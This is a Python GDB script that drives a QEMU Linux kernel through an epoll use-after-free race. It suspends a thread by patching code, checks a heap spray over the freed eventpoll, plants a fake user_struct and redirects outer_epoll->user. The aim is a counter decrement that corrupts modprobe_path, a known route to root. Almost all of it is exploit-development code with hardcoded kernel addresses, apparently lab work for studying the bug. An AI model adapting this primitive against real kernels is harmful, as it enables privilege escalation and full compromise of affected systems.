import gdb
import time
import os
import signal
import threading

gdb.execute("set pagination off")
gdb.execute("set confirm off")
gdb.execute("set non-stop off")

gdb.execute("set logging file evidence/EXP-023b_raw_gdb.log")
gdb.execute("set logging overwrite on")
gdb.execute("set logging on")

def log(msg):
    print(f"[*] {msg}", flush=True)

def connect():
    for i in range(10):
        try:
            gdb.execute("target remote :1234")
            log("Connected to QEMU")
            return True
        except gdb.error as e:
            log(f"Connection failed: {e}, retrying...")
            time.sleep(1)
    return False

if not connect():
    log("Failed to connect.")
    gdb.execute("quit")

# Target addresses
MODPROBE_PATH = 0xffff80008161d668
ROOT_USER = 0xffff80008152be98

outer_epoll_addr = 0
inner_epoll_addr = 0
ep_remove_wr_once_addr = 0
orig_insn = 0
fake_user_struct_addr = 0

thread_a_suspended = False

class RaceControl(gdb.Breakpoint):
    def __init__(self):
        super(RaceControl, self).__init__("*(__ep_remove + 0x19c)", internal=False)

    def stop(self):
        global outer_epoll_addr, inner_epoll_addr, ep_remove_wr_once_addr, orig_insn, thread_a_suspended
        
        if thread_a_suspended:
            return False
        
        log(f"Thread A hit __ep_remove+0x19c (WRITE_ONCE finished).")
        
        # Get the file and epitem from registers
        target_file = int(gdb.parse_and_eval("$x23"))
        epi = int(gdb.parse_and_eval("$x24"))
        
        # In our topology: Thread A closes outer1
        # __ep_remove(outer1, epi1_for_inner)
        # file = inner_epoll's file
        # target_epoll = file->f_ep = inner_epoll
        inner_epoll_addr = int(gdb.parse_and_eval(f"*(long*)({target_file} + 32)"))
        
        # The `ep` parameter is in $x0 (first arg)
        outer_epoll_addr = int(gdb.parse_and_eval("$x0"))
        
        log(f"outer_epoll (ep param) = {hex(outer_epoll_addr)}")
        log(f"inner_epoll (file->f_ep) = {hex(inner_epoll_addr)}")
        log(f"epi = {hex(epi)}")
        
        ep_remove_wr_once_addr = int(gdb.parse_and_eval("__ep_remove + 0x19c"))
        orig_insn = int(gdb.parse_and_eval(f"*(int*)({ep_remove_wr_once_addr})"))
        log(f"Original instruction at {hex(ep_remove_wr_once_addr)}: {hex(orig_insn)}")
        
        gdb.execute(f"set *(int*)({ep_remove_wr_once_addr}) = 0x14000000")
        log("Patched PC with infinite loop to suspend Thread A!")
        thread_a_suspended = True
        
        EpFreeBreak()
        self.enabled = False
        return False

class EpFreeBreak(gdb.Breakpoint):
    def __init__(self):
        super(EpFreeBreak, self).__init__("*0xffff8000802bcbb4", internal=False)

    def stop(self):
        ep = int(gdb.parse_and_eval("$x22"))
        log(f"Thread B hit ep_free({hex(ep)})!")
        EpFreeFinish()
        self.enabled = False
        return False

class EpFreeFinish(gdb.Breakpoint):
    def __init__(self):
        super().__init__("*0xffff8000802bcbbc", internal=False)

    def stop(self):
        log(f"Thread B finished ep_free. inner_epoll is now FREED!")
        
        log("Memory dump of freed inner_epoll (BEFORE spray):")
        try:
            mem_dump = gdb.execute(f"x/24gx {inner_epoll_addr}", to_string=True)
            log("\n" + mem_dump)
        except Exception as e:
            log(f"Error reading memory: {e}")
        
        def interrupt_later():
            time.sleep(3.0)
            log("Timer fired! Interrupting to check spray...")
            os.kill(os.getpid(), signal.SIGINT)
            
        t = threading.Thread(target=interrupt_later)
        t.daemon = True
        t.start()
        
        self.enabled = False
        return False

spray_checked = False
fake_user_struct_setup = False

def stop_handler(event):
    global outer_epoll_addr, inner_epoll_addr, fake_user_struct_addr, orig_insn, ep_remove_wr_once_addr, spray_checked, fake_user_struct_setup
    
    if isinstance(event, gdb.SignalEvent):
        if event.stop_signal == "SIGINT":
            if not spray_checked:
                log("Interrupted! Checking spray on inner_epoll...")
                try:
                    mem_dump = gdb.execute(f"x/24gx {inner_epoll_addr}", to_string=True)
                    log("\n" + mem_dump)
                    spray_checked = True
                except Exception as e:
                    log(f"Error: {e}")
                
                log("Continuing to let harness run spray...")
                gdb.execute("c")
                return
            
            if spray_checked and not fake_user_struct_setup:
                log("Setting up fake user_struct and overwriting outer_epoll->user...")
                try:
                    # Find a suitable location for fake user_struct
                    # Use a nearby address in the same slab page
                    fake_user_struct_addr = inner_epoll_addr + 0x200
                    
                    log(f"Writing fake user_struct at {hex(fake_user_struct_addr)}")
                    
                    # Fake user_struct layout:
                    # user_struct + 0: __count (8 bytes)
                    # user_struct + 8: percpu_counter.lock (4 bytes)
                    # user_struct + 16: percpu_counter.count (8 bytes)
                    # user_struct + 24: percpu_counter.list (16 bytes)
                    # user_struct + 40: percpu_counter.counters (8 bytes)
                    
                    gdb.execute(f"set *(long*)({fake_user_struct_addr}) = 1")  # __count
                    gdb.execute(f"set *(int*)({fake_user_struct_addr + 8}) = 0")  # lock
                    gdb.execute(f"set *(long*)({fake_user_struct_addr + 16}) = 0")  # count
                    gdb.execute(f"set *(long*)({fake_user_struct_addr + 40}) = {MODPROBE_PATH}")  # counters (user_struct + 40)
                    
                    # Verify
                    lock = int(gdb.parse_and_eval(f"*(int*)({fake_user_struct_addr + 8})"))
                    count = int(gdb.parse_and_eval(f"*(long*)({fake_user_struct_addr + 16})"))
                    counters = int(gdb.parse_and_eval(f"*(long*)({fake_user_struct_addr + 40})"))
                    log(f"Fake user_struct: lock={lock}, count={count}, counters={hex(counters)}")
                    
                    # Overwrite outer_epoll->user (offset 136) to point to fake_user_struct - 8
                    # So that ep->user + 8 = fake_user_struct + 8 = percpu_counter start
                    target_user_ptr = fake_user_struct_addr - 8
                    log(f"Overwriting outer_epoll->user (offset 136) to {hex(target_user_ptr)}")
                    gdb.execute(f"set *(long*)({outer_epoll_addr + 136}) = {target_user_ptr}")
                    
                    user_val = int(gdb.parse_and_eval(f"*(long*)({outer_epoll_addr + 136})"))
                    log(f"outer_epoll->user now = {hex(user_val)}")
                    
                    fake_user_struct_setup = True
                    
                except Exception as e:
                    log(f"Error setting up fake user_struct: {e}")
                
                log("Restoring Thread A and continuing...")
                try:
                    if ep_remove_wr_once_addr and orig_insn:
                        gdb.execute(f"set *(int*)({ep_remove_wr_once_addr}) = {orig_insn}")
                        log(f"Restored original instruction")
                except Exception as e:
                    log(f"Error restoring: {e}")
                
                # Set breakpoint at percpu_counter_add_batch to catch the decrement
                try:
                    gdb.execute("break percpu_counter_add_batch")
                    log("Set breakpoint at percpu_counter_add_batch")
                except Exception as e:
                    log(f"Could not set breakpoint: {e}")
                
                gdb.execute("c")
                return
            
            if isinstance(event, gdb.BreakpointEvent):
                bp = event.breakpoint
                if bp.location and "percpu_counter_add_batch" in bp.location:
                    log("*** BREAKPOINT HIT: percpu_counter_add_batch ***")
                    try:
                        log("=== BACKTRACE ===")
                        log(gdb.execute("bt", to_string=True))
                        log("=== REGISTERS ===")
                        log(gdb.execute("info registers", to_string=True))
                    except: pass
                    
                    # Check modprobe_path
                    try:
                        first_byte = int(gdb.parse_and_eval(f"*(char*)({MODPROBE_PATH})"))
                        log(f"modprobe_path[0] = {hex(first_byte)} ({chr(first_byte) if 32 <= first_byte < 127 else '?'})")
                        if first_byte == 0x2e:
                            log("*** SUCCESS: modprobe_path[0] decremented from '/' to '.'! ***")
                        elif first_byte == 0x2f:
                            log("modprobe_path[0] still '/'")
                    except Exception as e:
                        log(f"Error checking modprobe_path: {e}")
                    
                    gdb.execute("c")
                    return
            
        if event.stop_signal in ["SIGTRAP", "SIGSEGV", "SIGBUS"]:
            log(f"CRASH: {event.stop_signal}")
            try:
                log("=== BACKTRACE ===")
                log(gdb.execute("bt", to_string=True))
            except: pass
            gdb.execute("quit")

gdb.events.stop.connect(stop_handler)

RaceControl()
log("Breakpoints set. Continuing execution.")

def interrupt_if_hung():
    time.sleep(60.0)
    log("Hang timeout!")
    os.kill(os.getpid(), signal.SIGINT)

t_hung = threading.Thread(target=interrupt_if_hung)
t_hung.daemon = True
t_hung.start()

try:
    gdb.execute("c")
except KeyboardInterrupt:
    pass
except gdb.error as e:
    log(f"Execution stopped: {e}")

log("GDB script done.")